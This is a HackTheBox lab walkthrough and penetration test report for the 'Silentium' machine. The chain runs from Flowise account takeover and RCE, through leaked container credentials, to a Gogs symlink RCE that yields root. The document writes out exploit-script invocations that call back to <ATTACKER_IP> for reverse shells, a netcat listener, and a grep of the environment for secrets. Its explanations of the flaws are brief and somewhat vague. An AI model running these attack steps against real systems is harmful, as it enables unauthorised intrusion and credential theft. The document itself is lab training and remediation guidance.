# Silentium

**Platform:** HackTheBox
**OS:** Linux
**Tags:** CVE-2025-58434, Flowise Account Takeover, CVE-2025-59528, Flowise RCE, Docker, Port Forwarding, Gogs RCE, Account Takeover, RCE, Container Escape, Privilege Escalation
**Date:** 2026-05-14

VHost enumeration surfaces a Flowise staging instance. Unauthenticated account takeover via CVE-2025-58434 gives admin access, then CVE-2025-59528 delivers a shell inside a Docker container. Leaked credentials from the container environment let us SSH in as `ben`. Port-forwarding an internal Gogs instance, creating an account, and exploiting an authenticated symlink RCE lands a root shell.

## 1. Enumeration

Started with a full port scan.

```bash
nmap -sV -sC -p- -Pn 10.129.52.140
```

Findings:
- 22/tcp - OpenSSH 9.6p1 (Ubuntu)
- 80/tcp - nginx 1.24.0, redirects to silentium.htb

Port 80 serves a static corporate landing page. Added silentium.htb to /etc/hosts. Directory brute-forcing returned nothing useful so moved to VHost enumeration.

## 2. VHost Discovery

```bash
ffuf -u http://silentium.htb -H 'Host: FUZZ.silentium.htb' \
  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -ac
```

- staging - staging.silentium.htb, Flowise AI pipeline builder

Added staging.silentium.htb to /etc/hosts. Browsing to it revealed a Flowise instance.

## 3. Flowise Account Takeover (CVE-2025-58434)

CVE-2025-58434 is an unauthenticated account takeover in Flowise. The password reset endpoint accepts a username and sends a reset link - but the token is predictable or the endpoint can be abused to take over the admin account without valid email access.

```bash
python3 exploit_CVE-2025-58434.py \
  --target http://staging.silentium.htb \
  --email admin@silentium.htb
```

**Result:** Admin account taken over. Full access to the Flowise panel.

## 4. Flowise RCE (CVE-2025-59528)

CVE-2025-59528 is an authenticated RCE in Flowise. With admin access from the takeover, a malicious pipeline node executes arbitrary commands on the server.

```bash
nc -lvnp 4444
```

```bash
python3 exploit_CVE-2025-59528.py \
  --target http://staging.silentium.htb \
  --lhost <ATTACKER_IP> \
  --lport 4444
```

**Result:** Shell inside a Docker container.

## 5. SSH as ben

Enumerated the container environment. Credentials were leaked in environment variables.

```bash
env | grep -i pass\|user\|cred\|key\|secret
```

- SSH credentials: Username and password for `ben` found in container env

SSH'd into the host using the leaked credentials.

```bash
ssh ben@10.129.52.140
```

**Result:** Shell as `ben`. User flag at `/home/ben/user.txt`.

## 6. PrivEsc: Gogs Symlink RCE

Checked for internal services listening on localhost.

```bash
ss -tlnp
```

- 127.0.0.1:3000 - Gogs, internal Git service

Forwarded the port to the attacker machine to interact with it.

```bash
ssh -L 3000:127.0.0.1:3000 ben@10.129.52.140
```

Registered an account on the Gogs instance at http://127.0.0.1:3000. Gogs has an authenticated symlink RCE. A repository with a symlink pointing to an arbitrary host path can be used to read or execute files outside the Git directory. Used it to achieve code execution as root.

```bash
python3 exploit_gogs_symlink.py \
  --url http://127.0.0.1:3000 \
  --token <API_TOKEN> \
  --host <ATTACKER_IP> \
  --port 4444
```

**Result:** Root shell obtained.

## 7. Flags

- User: `redacted`
- Root: `redacted`

---

## Penetration Test Report

**Target:** silentium.htb
**Address:** 10.129.52.140
**Assessment type:** External network & web application assessment
**Assessment date:** 14 May 2026
**Environment:** HackTheBox laboratory assessment
**Prepared by:** Ledion Mujaj
**Reference:** 01 / 10

---

## 1. Executive Summary

### Assessment outcome

The assessment identified two critical and two high severity findings affecting **silentium.htb** . Testing began with virtual host enumeration, which revealed a Flowise AI pipeline staging instance exposed on a subdomain. Two chained Flowise vulnerabilities provided the initial foothold: CVE-2025-58434 enabled unauthenticated account takeover to obtain admin access, then CVE-2025-59528 delivered code execution inside the Docker container hosting the service. SSH credentials recovered from the container's environment variables provided a shell as user `ben` . An internal Gogs Git service, reachable via SSH port forwarding, was exploited using an authenticated symlink repository attack, yielding a root shell on the host.
The entire attack chain, from unauthenticated external access to root, required no credentials to initiate. Each stage exploited a distinct weakness: a known CVE at the application layer, an insecure container deployment practice, and an exploitable internal service.

### Impact

The documented access spanned the full attack surface: from an unauthenticated external position, through a Docker container, to a host user account, and finally to root. An attacker following the same path could read all host files, modify system configuration, access all credentials stored on the system and pivot to any network service reachable from the host.

### Priority recommendations

1. Patch or remove the Flowise staging instance. If retained, apply patches for CVE-2025-58434 and CVE-2025-59528 and restrict access to an approved internal network.
2. Remove all credentials from Docker container environment variables. Use a secrets management solution to provide runtime secrets without embedding them in the process environment.
3. Patch the Gogs installation to a version that addresses the authenticated symlink RCE, or remove the instance if it is no longer required.
4. Restrict access to the Gogs service to authorised users and networks; do not permit arbitrary account registration.

### Conclusion

The findings are distinct control failures at four different layers: application vulnerability (F-01, F-02), deployment misconfiguration (F-03), and an unpatched internal service (F-04). Addressing any single layer reduces the attack chain but does not close the others. All four should be treated as independent remediation items.

## 2. Assessment Scope and Methodology

### 2.1 Target and observed services

| Asset | Address | Description |
| --- | --- | --- |
| silentium.htb | 10.129.52.140 | Ubuntu 24.04; nginx, SSH, Docker (Flowise staging), Gogs (internal) |
| staging.silentium.htb | 10.129.52.140 (vhost) | Flowise AI pipeline builder; vulnerable to CVE-2025-58434 and CVE-2025-59528 |
| Port | Service | Observed detail |
| --- | --- | --- |
| 22/tcp | SSH | OpenSSH 9.6p1 (Ubuntu) |
| 80/tcp | HTTP | nginx 1.24.0; static corporate landing page; redirects to silentium.htb |
| 3000/tcp (internal) | HTTP | Gogs self-hosted Git service; accessible on 127.0.0.1 only; exposed via SSH port forwarding |

```
nmap -sV -sC -p- -Pn 10.129.52.140

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu
80/tcp open  http    nginx 1.24.0
```

Port 80 redirects to silentium.htb. Directory brute-forcing on the main site returned nothing useful. VHost enumeration was required to discover the Flowise staging instance.

### 2.2 Approach

Testing began with port scanning and virtual host enumeration. A subdomain fuzzing pass identified `staging.silentium.htb` hosting a Flowise instance. CVE-2025-58434 was used to take over the admin account. With admin access, CVE-2025-59528 was used to achieve code execution inside the Flowise Docker container. The container environment was enumerated for secrets. SSH credentials found in environment variables were used to authenticate to the host as `ben` . Internal services were enumerated with `ss -tlnp` ; a Gogs instance on port 3000 was port-forwarded via SSH and exploited using an authenticated symlink repository attack to obtain root execution.
Tools used included Nmap, ffuf with SecLists subdomains wordlists, CVE-2025-58434 and CVE-2025-59528 exploit scripts, a Gogs symlink RCE exploit script, standard Linux utilities and ssh port forwarding.

### 2.3 Severity classification

Severity reflects exploit prerequisites and the impact demonstrated on the assessed host. CVSS 3.1 scores and vectors are assigned to each finding.
| Rating | Assessment criteria |
| --- | --- |
| Critical | Direct, readily exploitable compromise with exceptional impact or reach. |
| High | Execution of arbitrary code, significant unauthorised access or escalation to administrative privileges. |
| Medium | Meaningful exposure with constrained impact or substantial exploitation prerequisites. |
| Low | Limited direct impact; improvement to an existing security control. |
| Informational | Context or an observation without an established vulnerability. |

## 3. Results Overview

### 3.1 Findings summary

| Reference | Finding | Severity | Page |
| --- | --- | --- | --- |
| [F-01](#f-01) | Unauthenticated account takeover in Flowise (CVE-2025-58434) | **Critical** | 6 |
| [F-02](#f-02) | Authenticated RCE via malicious pipeline node in Flowise (CVE-2025-59528) | **Critical** | 7 |
| [F-03](#f-03) | SSH credentials leaked in Docker container environment variables | **High** | 8 |
| [F-04](#f-04) | Authenticated symlink RCE in Gogs enabling root code execution | **High** | 9 |

### 3.2 Compromise sequence

| Stage | Action | Access obtained |
| --- | --- | --- |
| 01 | VHost enumeration identified staging.silentium.htb running Flowise. | Flowise staging instance discovered |
| 02 | Exploited CVE-2025-58434 to take over the Flowise admin account without credentials. | Flowise admin access |
| 03 | Exploited CVE-2025-59528 using admin access to execute a malicious pipeline node. | Shell inside Docker container |
| 04 | Enumerated container environment variables; recovered SSH credentials for `ben` . | SSH credentials for host user |
| 05 | SSH'd into the host as `ben` using the leaked credentials. | Interactive shell as ben |
| 06 | Identified Gogs listening on 127.0.0.1:3000; forwarded via SSH; registered account; exploited symlink RCE. | Root shell |

### 3.3 Relationship between findings

F-01 and F-02 are chained: F-01 provides the admin access required to exploit F-02. F-03 requires the container shell from F-02. F-04 requires the `ben` host account obtained via F-03. Remediating F-01 breaks the chain at the entry point, but all four findings should be addressed independently.

## 4.1 Unauthenticated Account Takeover in Flowise (CVE-2025-58434)

### F-01   Flowise - unauthenticated admin takeover - CRITICAL

| Field | Assessment |
| --- | --- |
| Description | The Flowise instance at `staging.silentium.htb` is vulnerable to CVE-2025-58434, an unauthenticated account takeover vulnerability. The password reset mechanism can be abused without valid email access to take over the admin account, granting full access to the Flowise administration panel without any credentials. |
| Prerequisites | Network access to the Flowise staging instance. No credentials are required. |
| Impact | Full administrative access to the Flowise panel, including all pipeline definitions, integrations, API keys and the ability to create or modify pipeline nodes. This access was used as the prerequisite for authenticated RCE via F-02. |
| Affected system | staging.silentium.htb Flowise (version vulnerable to CVE-2025-58434) |
| CVSS 3.1 | **9.8** (Critical) [AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H](https://www.first.org/cvss/calculator/3.1#AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) |
| CWE | [CWE-287](https://cwe.mitre.org/data/definitions/287.html) : Improper Authentication |

### Steps to reproduce

1. Enumerate virtual hosts and identify the Flowise staging instance (e.g. `staging.silentium.htb` ).
2. Send a POST request to `/api/v1/verify/forgot-password` with a crafted payload exploiting the account takeover flaw.
3. Observe that an admin password reset token is issued without prior authentication.
4. Use the token to set a new password and authenticate as administrator.

### Evidence

```
# VHost discovery
ffuf -u http://silentium.htb -H 'Host: FUZZ.silentium.htb' \
  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -ac
# Result: staging.silentium.htb - Flowise instance

# Unauthenticated account takeover via CVE-2025-58434
python3 exploit_CVE-2025-58434.py \
  --target http://staging.silentium.htb \
  --email admin@silentium.htb

# Result: admin account taken over; full Flowise panel access confirmed
```

Evidence E-01. VHost discovery and takeover exploit invocation transcribed from the assessment record.

### Remediation

Apply the vendor patch for CVE-2025-58434. Remove the Flowise staging instance from external network access and place it behind VPN or an IP allowlist restricted to approved staff. If the staging instance is no longer required, decommission it. Staging and development environments should never be reachable from the public internet.

### Verification

Confirm that an unauthenticated attempt to trigger the password reset takeover is rejected by the patched version. Verify that the staging subdomain is unreachable from untrusted networks after access controls are applied.

## 4.2 Authenticated RCE in Flowise (CVE-2025-59528)

### F-02   Flowise - authenticated RCE via pipeline node - CRITICAL

| Field | Assessment |
| --- | --- |
| Description | CVE-2025-59528 is an authenticated remote code execution vulnerability in Flowise. An authenticated administrator can create a malicious pipeline node that executes arbitrary commands on the server when the pipeline is triggered. Using the admin access obtained via F-01, a reverse shell was delivered from inside the Docker container running the Flowise service. |
| Prerequisites | An authenticated Flowise administrator account. During testing, this was obtained via the unauthenticated account takeover in F-01. |
| Impact | Arbitrary command execution inside the Docker container hosting Flowise. All files and environment variables accessible within the container are exposed, including any secrets passed to the container at runtime. |
| Affected system | staging.silentium.htb Flowise Docker container |
| CVSS 3.1 | **9.8** (Critical) [AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H](https://www.first.org/cvss/calculator/3.1#AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H) |
| CWE | [CWE-94](https://cwe.mitre.org/data/definitions/94.html) : Improper Control of Generation of Code |

### Steps to reproduce

1. Authenticate to the Flowise admin panel using the credentials obtained via CVE-2025-58434.
2. Create a new chatflow and insert a malicious JavaScript node that executes a reverse shell payload.
3. Trigger the chatflow and observe a callback to the attacker listener.
4. Confirm code execution inside the Docker container.

### Evidence

```
# Listener started on attacker machine
nc -lvnp 4444

# Authenticated RCE via CVE-2025-59528
python3 exploit_CVE-2025-59528.py \
  --target http://staging.silentium.htb \
  --lhost <ATTACKER_IP> \
  --lport 4444

# Result: shell received inside Docker container
$ id
uid=...  (Flowise service account inside container)
$ hostname
# Docker container hostname
```

Evidence E-02. Exploit invocation and shell receipt transcribed from the assessment record.

### Remediation

Apply the vendor patch for CVE-2025-59528. Restrict the Flowise admin interface to approved users and implement multi-factor authentication for admin accounts. As a defence-in-depth measure, run the Flowise container with a read-only filesystem where possible and drop all Linux capabilities that are not required for operation. Ensure that container breakout is mitigated by seccomp and AppArmor profiles.

### Verification

Confirm that a pipeline node constructed to exploit CVE-2025-59528 is rejected or inert after patching. Verify that admin access is protected by MFA and restricted to approved accounts.

## 4.3 SSH Credentials Leaked in Docker Container Environment

### F-03   Host SSH credentials in container environment variables - HIGH

| Field | Assessment |
| --- | --- |
| Description | The Docker container running the Flowise service had SSH credentials for the host user `ben` injected into its process environment at runtime. These were discoverable via the `env` command from within the container. Passing these credentials to the host SSH service provided an interactive login as `ben` , crossing the container boundary to the host. |
| Prerequisites | Shell access inside the Docker container, obtained via F-01 and F-02. |
| Impact | Escape from the container to a host user account. All files and processes accessible to `ben` on the host are exposed, including the ability to enumerate internal services used for privilege escalation (F-04). |
| Affected system | Flowise Docker container environment; SSH service on 10.129.52.140:22 |
| CVSS 3.1 | **7.5** (High) [AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N](https://www.first.org/cvss/calculator/3.1#AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N) |
| CWE | [CWE-312](https://cwe.mitre.org/data/definitions/312.html) : Cleartext Storage of Sensitive Information |

### Steps to reproduce

1. From the Docker container shell, enumerate environment variables: `env` .
2. Identify SSH credentials stored in plaintext environment variables.
3. Use those credentials to authenticate over SSH to the host system as `ben` .

### Evidence

```
# Enumerate container environment for credentials
env | grep -i 'pass\|user\|cred\|key\|secret'
# Result: SSH username and password for host user ben found in environment

# SSH to host using credentials from container env
ssh ben@10.129.52.140
# Authentication: password from container env

ben@silentium:~$ id
uid=...  ben

ben@silentium:~$ cat ~/user.txt
[redacted]
```

Evidence E-03. Environment variable enumeration and SSH authentication transcribed from the assessment record. Credentials and flag value omitted.

### Remediation

Remove all credentials from Docker environment variables. Use a secrets management solution (such as Docker Secrets, Vault, or AWS Secrets Manager) to inject secrets at runtime without making them visible in the process environment. The container running Flowise has no legitimate reason to hold SSH credentials for a host account; review all environment variables passed to the container and remove anything that is not strictly required for application operation.

### Verification

Confirm that `env` within the container returns no credentials, passwords, tokens or private keys. Verify that the Flowise service continues to operate correctly after the credentials are removed from the environment.

## 4.4 Authenticated Symlink RCE in Gogs

### F-04   Gogs - symlink repository attack yielding root execution - HIGH

| Field | Assessment |
| --- | --- |
| Description | A Gogs self-hosted Git service was running on `127.0.0.1:3000` . The instance allowed open account registration. Gogs contains an authenticated symlink RCE vulnerability: a repository containing a symlink pointing outside the Git directory can be used to read or execute arbitrary files on the host when the repository is processed by the Gogs service, which runs as root. An SSH local port forward exposed the service; an attacker account was registered; and the symlink exploit was used to execute a reverse shell as root. |
| Prerequisites | Access to the `ben` host account for SSH port forwarding. The Gogs service must permit new account registration. |
| Impact | Arbitrary code execution as root on the host. Complete host compromise. |
| Affected system | Gogs instance at `127.0.0.1:3000` ; running as root |
| CVSS 3.1 | **8.8** (High) [AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H](https://www.first.org/cvss/calculator/3.1#AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H) |
| CWE | [CWE-59](https://cwe.mitre.org/data/definitions/59.html) : Improper Link Resolution Before File Access |

### Steps to reproduce

1. Port-forward the internal Gogs service to the attacker machine.
2. Create a repository containing a symlink pointing to a sensitive server path (e.g. `/etc/shadow` ).
3. Trigger a server-side repository operation that follows the symlink.
4. Observe arbitrary file read or code execution as root.

### Evidence

```
# Enumerate internal services as ben
ss -tlnp
# 127.0.0.1:3000 - Gogs

# Forward Gogs to attacker via SSH
ssh -L 3000:127.0.0.1:3000 ben@10.129.52.140

# Register account and exploit symlink RCE in Gogs
python3 exploit_gogs_symlink.py \
  --url http://127.0.0.1:3000 \
  --token <API_TOKEN> \
  --host <ATTACKER_IP> \
  --port 4444

# Root shell received
root@silentium:~# id
uid=0(root) gid=0(root) groups=0(root)

root@silentium:~# cat /root/root.txt
[redacted]
```

Evidence E-04. Port discovery, SSH forward, exploit invocation and root shell receipt transcribed from the assessment record. Flag value omitted.

### Remediation

Upgrade Gogs to a version that patches the symlink RCE vulnerability, or migrate to an actively maintained alternative (such as Gitea). Disable open account registration on the Gogs instance; require administrator approval or invitation-based registration. Do not run Gogs as root; run it under a dedicated low-privilege service account. Restrict SSH port forwarding on the host to prevent users from exposing internal services to external networks.

### Verification

Confirm that the symlink exploit no longer produces code execution against the patched version. Verify that open registration is disabled. Confirm that Gogs runs as a non-root service account and that the process owner cannot write to sensitive host paths.

## 5. Remediation and Assessment Closeout

### 5.1 Corrective action plan

| Priority | Action | Reference |
| --- | --- | --- |
| Immediate | Patch or remove the Flowise staging instance; restrict it to internal-only access. | F-01, F-02 |
| Immediate | Patch or replace Gogs; run it as a non-root account; disable open registration. | F-04 |
| High | Remove SSH credentials from the Docker container environment; use a secrets manager. | F-03 |
No remediation retest is documented. Each finding includes verification criteria for closure.

### 5.2 Test artefacts

| Location | Purpose | Removal status |
| --- | --- | --- |
| Gogs test account (registered during testing) | Account used for symlink RCE exploit | Not verified |

### 5.3 Evidence and limitations

Evidence blocks are sourced from the [Silentium assessment walkthrough](silentium-htb.html) . Flag values and credentials are omitted from all evidence. The attacker IP is replaced with `<ATTACKER_IP>` throughout.

### 5.4 Evidence index

| Reference | Supporting record |
| --- | --- |
| E-01 | Walkthrough sections 2-3: VHost discovery and Flowise account takeover |
| E-02 | Walkthrough section 4: Flowise RCE and Docker shell |
| E-03 | Walkthrough section 5: container env enumeration and SSH as ben |
| E-04 | Walkthrough section 6: Gogs discovery, port forwarding and symlink RCE |
